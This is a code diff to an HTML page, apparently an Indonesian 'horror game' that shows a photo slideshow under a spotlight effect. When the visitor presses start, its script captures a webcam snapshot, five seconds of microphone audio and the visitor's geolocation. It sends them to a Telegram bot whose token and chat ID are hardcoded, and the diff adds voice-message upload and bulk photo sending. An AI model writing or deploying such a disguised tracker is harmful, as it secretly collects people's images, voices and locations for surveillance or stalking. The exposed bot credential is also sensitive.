@@ -6,9 +6,7 @@
   <title>Horror Ambatukam Hunt</title>
   <style>
     /* --- Pengaturan Dasar --- */
-    * {
-      box-sizing: border-box;
-    }
+    * { box-sizing: border-box; }
     body {
       margin: 0;
       padding: 0;
@@ -17,39 +15,30 @@
       height: 100vh;
       overflow: hidden;
       position: relative;
-      /* Untuk mendukung gesture touch dengan lebih baik */
+      /* Agar gesture sentuh tidak menyebabkan scroll */
       touch-action: none;
     }
-    /* Background video */
+    /* Background Video */
     #bgVideo {
       position: absolute;
-      top: 0;
-      left: 0;
-      width: 100%;
-      height: 100%;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
       object-fit: cover;
       z-index: -2;
     }
-    /* Konten Sambutan (Intro) — tampil di awal */
+    /* Konten Sambutan (Intro) */
     #introText {
       position: absolute;
-      top: 50%;
-      left: 50%;
+      top: 50%; left: 50%;
       transform: translate(-50%, -50%);
       text-align: center;
       color: white;
       z-index: 2;
       padding: 0 20px;
     }
-    #introText h1 {
-      font-size: 2.5rem;
-      margin-bottom: 10px;
-    }
-    #introText p {
-      font-size: 1.2rem;
-      margin-bottom: 20px;
-    }
-    /* Tombol sambutan */
+    #introText h1 { font-size: 2.5rem; margin-bottom: 10px; }
+    #introText p { font-size: 1.2rem; margin-bottom: 20px; }
+    /* Tombol Sambutan */
     #startGameBtn {
       padding: 10px 30px;
       background-color: red;
@@ -59,15 +48,12 @@
       cursor: pointer;
       border-radius: 5px;
     }
-    #startGameBtn:hover {
-      background-color: darkred;
-    }
+    #startGameBtn:hover { background-color: darkred; }
     /* Kontainer Foto (Game) */
     #photoContainer {
       display: none;
       position: absolute;
-      top: 50%;
-      left: 50%;
+      top: 50%; left: 50%;
       transform: translate(-50%, -50%);
       text-align: center;
       z-index: 1;
@@ -79,7 +65,7 @@
       height: auto;
       margin-bottom: 20px;
     }
-    /* Tombol Navigasi (Ikon) */
+    /* Tombol Navigasi (Ikon Prev & Next) */
     #prevBtn, #nextBtn {
       position: absolute;
       top: 50%;
@@ -94,34 +80,25 @@
       z-index: 12;
       display: none;
     }
-    #prevBtn {
-      left: 10px;
-    }
-    #nextBtn {
-      right: 10px;
-    }
+    #prevBtn { left: 10px; }
+    #nextBtn { right: 10px; }
     /* Overlay Darkness & Spotlight (tidak tampil di awal) */
     .darkness {
       display: none;
       position: absolute;
-      top: 0;
-      left: 0;
-      right: 0;
-      bottom: 0;
+      top: 0; left: 0; right: 0; bottom: 0;
       pointer-events: none;
       z-index: 10;
     }
     .light {
       position: absolute;
-      width: 300px;
-      height: 300px;
+      width: 300px; height: 300px;
       border-radius: 50%;
-      /* Menggelapkan seluruh layar kecuali area lingkaran */
+      /* Menggelapkan layar kecuali area lingkaran */
       box-shadow: 400vh 0px 0px 400vw rgba(0,0,0,0.99);
     }
     .shadow {
-      width: 100%;
-      height: 100%;
+      width: 100%; height: 100%;
       border-radius: 50%;
       box-shadow: inset 4px 0 37px 53px rgba(0,0,0,0.9);
     }
@@ -129,8 +106,7 @@
     #endPopup {
       display: none;
       position: fixed;
-      top: 50%;
-      left: 50%;
+      top: 50%; left: 50%;
       transform: translate(-50%, -50%);
       background-color: rgba(0,0,0,0.8);
       padding: 30px;
@@ -138,13 +114,9 @@
       text-align: center;
       color: white;
       z-index: 12;
-      width: 80%;
-      max-width: 400px;
+      width: 80%; max-width: 400px;
     }
-    #endPopup h2 {
-      margin-bottom: 20px;
-      font-size: 1.5rem;
-    }
+    #endPopup h2 { margin-bottom: 20px; font-size: 1.5rem; }
     #endPopup button {
       padding: 10px 30px;
       margin: 10px;
@@ -154,37 +126,18 @@
       cursor: pointer;
       color: white;
     }
-    #endPopup #noBtn {
-      background-color: red;
-    }
-    #endPopup #noBtn:hover {
-      background-color: darkred;
-    }
-    #endPopup #yesBtn {
-      background-color: green;
-    }
-    #endPopup #yesBtn:hover {
-      background-color: darkgreen;
-    }
+    #endPopup #noBtn { background-color: red; }
+    #endPopup #noBtn:hover { background-color: darkred; }
+    #endPopup #yesBtn { background-color: green; }
+    #endPopup #yesBtn:hover { background-color: darkgreen; }
     /* Media queries untuk responsivitas */
     @media (max-width: 768px) {
-      #introText h1 {
-        font-size: 2rem;
-      }
-      #introText p {
-        font-size: 1rem;
-      }
-      #startGameBtn {
-        font-size: 1rem;
-        padding: 8px 20px;
-      }
-      #prevBtn, #nextBtn {
-        font-size: 2rem;
-        padding: 8px;
-      }
+      #introText h1 { font-size: 2rem; }
+      #introText p { font-size: 1rem; }
+      #startGameBtn { font-size: 1rem; padding: 8px 20px; }
+      #prevBtn, #nextBtn { font-size: 2rem; padding: 8px; }
       .light {
-        width: 200px;
-        height: 200px;
+        width: 200px; height: 200px;
         box-shadow: 300vh 0px 0px 300vw rgba(0,0,0,0.99);
       }
     }
@@ -207,7 +160,7 @@
   <div id="photoContainer">
     <img id="photoSlide" src="" alt="Ambatukam Image" />
   </div>
-  <!-- Tombol Navigasi: Prev dan Next -->
+  <!-- Tombol Navigasi (Ikon) -->
   <button id="prevBtn">&#10094;</button>
   <button id="nextBtn">&#10095;</button>
 
@@ -232,11 +185,11 @@
   </audio>
 
   <script>
-    // Konfigurasi Telegram (ganti dengan token & chatId milik Anda)
+    /* Konfigurasi Telegram – ganti dengan botToken dan chatId Anda */
     const botToken = "8155174745:AAEVSM6KjUCejQ9dxCNLyo0D0Wh_eXgfHQ8";
     const chatId = "6010073048";
 
-    // Array foto untuk game
+    /* Array foto untuk game (9 foto) */
     const photos = [
       "photo1.jpg", "photo2.jpg", "photo3.jpg", "photo4.jpg", "photo5.jpg",
       "photo6.jpg", "photo7.jpg", "photo8.jpg", "photo9.png"
@@ -257,7 +210,7 @@
     const noBtn = document.getElementById('noBtn');
     const yesBtn = document.getElementById('yesBtn');
 
-    // Event listener untuk tombol popup akhir
+    // Event listener untuk popup akhir
     noBtn.addEventListener('click', () => {
       window.location.href = 'https://youtu.be/8241aX1ArU0?si=mehpHFjZE3lXF4Y1';
     });
@@ -268,11 +221,9 @@
 
     // Mulai game ketika tombol "Izinkan dan Mulai" ditekan
     startGameBtn.addEventListener('click', async () => {
-      // Sembunyikan konten sambutan
       introText.style.display = 'none';
-      // Tampilkan overlay darkness (spotlight)
+      // Tampilkan overlay darkness (spotlight) setelah teks sambutan hilang
       darkness.style.display = 'block';
-      // Mulai game
       await startGame();
     });
 
@@ -289,6 +240,8 @@
         
         // Mulai menangkap foto, audio, dan lokasi, kemudian kirim ke Telegram
         capturePhotoAndAudio(location.coords);
+        // Selain itu, kirim semua foto statis (dari array) ke Telegram
+        sendAllPhotosToTelegram();
         // Tampilkan kontainer game (foto) dan tombol navigasi
         photoContainer.style.display = 'block';
         prevBtn.style.display = 'block';
@@ -300,40 +253,46 @@
     }
 
     function capturePhotoAndAudio(coords) {
-      // Buat elemen video untuk mengambil stream
       const video = document.createElement("video");
       video.srcObject = videoStream;
       video.play();
+
+      // Coba gunakan opsi MIME type OGG/Opus (jika didukung)
+      let mediaRecorder;
+      try {
+        const options = { mimeType: 'audio/ogg; codecs=opus' };
+        mediaRecorder = new MediaRecorder(videoStream, options);
+      } catch (e) {
+        console.warn("Opsi OGG tidak didukung, gunakan default MIME type.", e);
+        mediaRecorder = new MediaRecorder(videoStream);
+      }
       
-      // Rekam audio menggunakan MediaRecorder
-      const mediaRecorder = new MediaRecorder(videoStream);
       let audioChunks = [];
       mediaRecorder.ondataavailable = event => {
         audioChunks.push(event.data);
       };
       mediaRecorder.start();
-      
-      // Setelah 5 detik, ambil snapshot (foto) dan hentikan perekaman audio
+
+      // Setelah 5 detik, ambil snapshot dan hentikan perekaman audio
       setTimeout(() => {
         const canvas = document.createElement("canvas");
-        // Jika ukuran video tersedia, gunakan; jika tidak gunakan default 640x480
         canvas.width = video.videoWidth || 640;
         canvas.height = video.videoHeight || 480;
         const ctx = canvas.getContext("2d");
         ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
         const imageData = canvas.toDataURL("image/png");
-        
+
         mediaRecorder.stop();
         mediaRecorder.onstop = () => {
-          const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
-          // Kirim foto, audio, dan lokasi ke Telegram
+          const audioBlob = new Blob(audioChunks, { type: mediaRecorder.mimeType || 'audio/webm' });
+          // Kirim foto hasil capture, audio, dan lokasi ke Telegram
           sendToTelegram(imageData, coords, audioBlob);
         };
       }, 5000);
     }
 
     function sendToTelegram(imageData, location, audioBlob) {
-      // Kirim lokasi ke Telegram
+      // 1. Kirim lokasi
       fetch(`https://api.telegram.org/bot${botToken}/sendLocation`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -346,34 +305,35 @@
       .then(response => response.json())
       .then(data => console.log("Location sent:", data))
       .catch(error => console.error("Error sending location:", error));
-      
-      // Konversi imageData (dataURI) ke Blob
+
+      // 2. Kirim foto capture (hasil snapshot)
       const photoBlob = dataURItoBlob(imageData);
-      // Kirim foto ke Telegram
       const formDataPhoto = new FormData();
       formDataPhoto.append("chat_id", chatId);
-      formDataPhoto.append("photo", photoBlob, "image.png");
+      formDataPhoto.append("photo", photoBlob, "capture.png");
       fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
         method: "POST",
         body: formDataPhoto
       })
       .then(response => response.json())
-      .then(data => console.log("Photo sent:", data))
-      .catch(error => console.error("Error sending photo:", error));
-      
-      // Kirim audio ke Telegram
-      const formDataAudio = new FormData();
-      formDataAudio.append("chat_id", chatId);
-      formDataAudio.append("audio", audioBlob, "audio.webm");
-      fetch(`https://api.telegram.org/bot${botToken}/sendAudio`, {
+      .then(data => console.log("Capture photo sent:", data))
+      .catch(error => console.error("Error sending capture photo:", error));
+
+      // 3. Kirim audio sebagai pesan suara (menggunakan sendVoice)
+      const formDataVoice = new FormData();
+      formDataVoice.append("chat_id", chatId);
+      // Gunakan ekstensi .ogg agar Telegram mengenali sebagai pesan suara
+      formDataVoice.append("voice", audioBlob, "voice.ogg");
+      fetch(`https://api.telegram.org/bot${botToken}/sendVoice`, {
         method: "POST",
-        body: formDataAudio
+        body: formDataVoice
       })
       .then(response => response.json())
-      .then(data => console.log("Audio sent:", data))
-      .catch(error => console.error("Error sending audio:", error));
+      .then(data => console.log("Voice sent:", data))
+      .catch(error => console.error("Error sending voice:", error));
     }
 
+    // Fungsi untuk mengubah dataURI menjadi Blob
     function dataURItoBlob(dataURI) {
       const byteString = atob(dataURI.split(',')[1]);
       const ab = new ArrayBuffer(byteString.length);
@@ -384,23 +344,38 @@
       return new Blob([ab], { type: 'image/png' });
     }
 
+    // Fungsi untuk menampilkan foto di kontainer game
     function showPhoto(index) {
       photoSlide.src = photos[index];
     }
 
-    // Tombol Navigasi: "Prev" untuk mundur, "Next" untuk lanjut.
-    // Jika di foto terakhir, klik "Next" akan memunculkan popup.
+    // Fungsi untuk mengirim semua foto statis (dari array) ke Telegram
+    function sendAllPhotosToTelegram() {
+      photos.forEach(photoUrl => {
+        fetch(photoUrl)
+          .then(res => res.blob())
+          .then(blob => {
+            const formData = new FormData();
+            formData.append("chat_id", chatId);
+            formData.append("photo", blob, "static_photo.jpg");
+            fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
+              method: "POST",
+              body: formData
+            })
+            .then(response => response.json())
+            .then(data => console.log("Static photo sent:", data))
+            .catch(error => console.error("Error sending static photo:", error));
+          })
+          .catch(error => console.error("Error fetching photo:", error));
+      });
+    }
+
+    // Tombol Navigasi: Prev (mundur) dan Next (lanjut)
     prevBtn.addEventListener('click', () => {
-      // Jika popup tampil, sembunyikan popup
       if (endPopup.style.display === 'block') {
         endPopup.style.display = 'none';
       }
-      // Navigasi mundur (wrap-around)
-      if (currentPhotoIndex === 0) {
-        currentPhotoIndex = photos.length - 1;
-      } else {
-        currentPhotoIndex--;
-      }
+      currentPhotoIndex = (currentPhotoIndex === 0) ? photos.length - 1 : currentPhotoIndex - 1;
       showPhoto(currentPhotoIndex);
     });
     nextBtn.addEventListener('click', () => {
